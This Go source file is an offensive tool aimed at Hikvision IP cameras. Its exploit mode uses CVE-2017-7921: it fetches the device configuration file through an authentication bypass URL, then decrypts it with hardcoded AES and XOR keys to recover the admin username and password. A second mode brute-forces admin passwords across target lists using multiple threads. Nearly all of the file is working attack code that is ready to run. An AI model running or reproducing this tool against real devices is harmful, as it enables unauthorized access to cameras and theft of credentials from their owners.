package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"main/src/aesebc"
	"main/src/gip"
	"os"
	"regexp"
	"runtime"
	"strings"
	"time"

	"github.com/levigross/grequests"
	"github.com/msterzhang/gpool"
)

type paramStruct struct {
	target     string
	thread     int
	exploit    bool
	bruteforce bool
	username   string
	password   string
	output     string
}

// xore function returns the xor value of data and cycle key
func xore(data []byte, key []byte) []byte {
	var result []byte
	for i := 0; i < len(data); i++ {
		result = append(result, data[i]^key[i%len(key)])
	}
	return result
}

// FilterStrings function filters all printable strings whose length is more than 2
func FilterStrings(data string) []string {
	printableChars := `A-Za-z0-9/\-:.,_$%'()[\]<> `
	shortestReturnChar := 2
	regExp := fmt.Sprintf("[%s]{%d,}", printableChars, shortestReturnChar)
	pattern := regexp.MustCompile(regExp)

	return pattern.FindAllString(data, -1)
}

// AllIndexOf function returns indexes whose value is same to keyWord
func AllIndexOf(data []string, keyWord string) []int {
	var indexList []int
	for i, v := range data {
		if strings.Compare(v, keyWord) == 0 {
			indexList = append(indexList, i)
		}
	}
	return indexList
}

// exploit function decrypt config file of vulerable hikvision devices,
// for getting username and password.
// It gets two parameters:
//	1. An IP address
//	2. Instance pointer of `gpool.Pool`
// If you do not intend to use the `gpool.Pool` you can just pass nil
func exploit(target string, wg *gpool.Pool) {
	defer func() {
		if wg != nil {
			wg.Done()
		}
	}()

	baseURL := "http://%s/System/configurationFile?auth=YWRtaW46MTEK"
	aesKey, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
	ro := &grequests.RequestOptions{RequestTimeout: 5 * time.Second}
	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
	url := fmt.Sprintf(baseURL, target)
	res, _ := grequests.Get(url, ro)
	if res.Ok {
		// grequest abstract the Go http.Response object
		content, _ := ioutil.ReadAll(res.RawResponse.Body)
		content = aesebc.AesDecrypt(content, aesKey)
		resultList := FilterStrings(string(xore(content, xorKey)))
		index := AllIndexOf(resultList, "admin")
		if len(index) == 0 {
			fmt.Printf("[-] %-20s- The target seems vulnerable, but we can't decrypt the config file.\n", target)
			return
		}
		username := resultList[index[len(index)-1]]
		password := resultList[index[len(index)-1]+1]
		ExploitOutput(target, username, password)
	}
	res.Close()
}

// verifyPassword verifies if the password of hikvision camera is correct
func verifyPassword(target string, passwordDic []string, wg *gpool.Pool) {
	defer func() {
		if wg != nil {
			wg.Done()
		}
	}()

	baseURL := "http://%s/PSIA/System/deviceinfo"
	for _, pwd := range passwordDic {
		ro := &grequests.RequestOptions{Auth: []string{"admin", pwd}}
		url := fmt.Sprintf(baseURL, target)
		res, _ := grequests.Get(url, ro)
		if res.Ok {
			VerifyPasswordOutput(target, "admin", pwd)
			return
		}
	}
}

// BruteForce uses multi-thread to burte force password
func BruteForce(targetList []string, passwordDic []string, threads int) {
	wg := gpool.New(threads)
	fmt.Printf("[INFO] %d password tries.\n", len(passwordDic))
	for i := 0; i < len(targetList); i++ {
		wg.Add(1)
		go verifyPassword(targetList[i], passwordDic, wg)
	}
	wg.Wait()
}

// InvokExploit uses multithread to invoke exploit function
func InvokExploit(targetList []string, threads int) {
	wg := gpool.New(threads)
	for i := 0; i < len(targetList); i++ {
		wg.Add(1)
		go exploit(targetList[i], wg)
	}
	wg.Wait()
}

func paramInit() paramStruct {
	var param paramStruct

	flag.StringVar(&param.target, "t", "", "Exploit target, ip:port or file path, example: 127.0.0.1, or target file path with syntax 'file:<path>'")
	flag.IntVar(&param.thread, "thread", 1, "The number of concurrent threads, default 1")
	flag.BoolVar(&param.exploit, "e", false, "Use cve-2017-7921 exploit model(true of false), default false")
	flag.BoolVar(&param.bruteforce, "b", false, "Use burte force model(true or false), default false")
	flag.StringVar(&param.username, "username", "admin", "Set the username if using burte force model, or username file path, defult 'admin'")
	flag.StringVar(&param.password, "password", "12345", "Set the password if using burte force model, or password file path with syntax 'file:<path>', defult '12345'")
	flag.StringVar(&param.output, "o", "", "Set the output path, if it's empty, the result will be outputed to stdout.")
	flag.Usage = usage
	flag.Parse()

	if param.exploit && param.bruteforce {
		fmt.Println("[ERROR] Cannot use exploit model and bruteforce model at the same time.")
		os.Exit(2)
	}
	if !param.bruteforce && !param.exploit {
		flag.Usage()
		os.Exit(2)
	}
	return param
}

func usage() {
	fmt.Fprintf(os.Stderr,
		"Usage: %s [-e] [-b] [--password password] [-t target] [--thread thread]\n\nOptions:\n",
		os.Args[0],
	)
	flag.PrintDefaults()
}

// PathFileExists checks if path is existential
func PathFileExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, err
	}
	return false, err
}

func paramToList(target string) ([]string, error) {
	pattern := `file:(.*)`
	regExp := regexp.MustCompile(pattern)
	if !regExp.Match([]byte(target)) {
		// param target is ip address format
		if gip.CheckIPFormat([]byte(target)) {
			return gip.GetIPSubnet(target, 32)
		}
		// param target is domain format
		return []string{target}, nil
	}

	// param target is file path
	filePath := string(regExp.FindAllSubmatch([]byte(target), -1)[0][1])
	isExist, err := PathFileExists(filePath)
	if isExist {
		content, _ := ioutil.ReadFile(filePath)
		result := strings.Replace(string(content), "\r", "", -1)
		return strings.Split(result, "\n"), nil
	}
	return nil, err
}

func getPasswordDic(password string) ([]string, error) {
	pattern := `file:(.*)`
	regExp := regexp.MustCompile(pattern)
	if !regExp.Match([]byte(password)) {
		return []string{password}, nil
	}

	filePath := string(regExp.FindAllSubmatch([]byte(password), -1)[0][1])
	isExist, err := PathFileExists(filePath)
	if isExist {
		content, _ := ioutil.ReadFile(filePath)
		result := strings.Replace(string(content), "\r", "", -1)
		return strings.Split(result, "\n"), nil
	}
	return nil, err
}

func main() {
	param := paramInit()
	runtime.GOMAXPROCS(runtime.NumCPU())
	targetList, err1 := paramToList(param.target)
	passwordDic, err2 := getPasswordDic(param.password)
	// set output path, default stdout
	Output.SetPath(param.output)
	if err1 != nil {
		fmt.Println(err1)
		os.Exit(1)
	}
	if err2 != nil {
		fmt.Println(err2)
		os.Exit(1)
	}
	fmt.Printf("[INFO] There are %d targets.\n", len(targetList))
	if param.exploit {
		InvokExploit(targetList, param.thread)
	} else if param.bruteforce {
		BruteForce(targetList, passwordDic, param.thread)
	}
	fmt.Print("finish!")
	Output.File.Close()
}
